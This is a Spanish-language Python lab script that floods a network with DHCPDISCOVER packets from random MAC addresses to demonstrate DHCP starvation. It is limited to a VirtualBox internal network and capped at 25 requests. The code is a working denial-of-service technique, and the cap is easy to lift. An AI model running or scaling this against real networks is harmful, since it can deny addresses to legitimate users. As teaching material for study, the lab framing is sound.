#!/usr/bin/env python3
"""
Script de laboratorio para comprobar DHCP Starvation.

Uso exclusivo en una Red Interna de VirtualBox.
No utilizar contra redes ajenas o reales.

Ejemplo:
    python3 dhcp_starvation_laboratorio.py --interface eth0 --cantidad 10
"""

import argparse
import random
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp


def generar_mac():
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def enviar_discover(interfaz, cantidad):
    for i in range(1, cantidad + 1):
        mac = generar_mac()

        paquete = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac.replace(":", "")) /
            DHCP(options=[("message-type", "discover"), "end"])
        )

        sendp(paquete, iface=interfaz, verbose=False)
        print(f"[{i}/{cantidad}] DHCPDISCOVER enviado con MAC {mac}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Prueba controlada de DHCP Starvation")
    parser.add_argument("--interface", default="eth0", help="Interfaz de red")
    parser.add_argument("--cantidad", type=int, default=10, help="Número máximo de peticiones")

    args = parser.parse_args()

    if args.cantidad > 25:
        raise SystemExit("Por seguridad, el máximo permitido en laboratorio es 25 peticiones.")

    enviar_discover(args.interface, args.cantidad)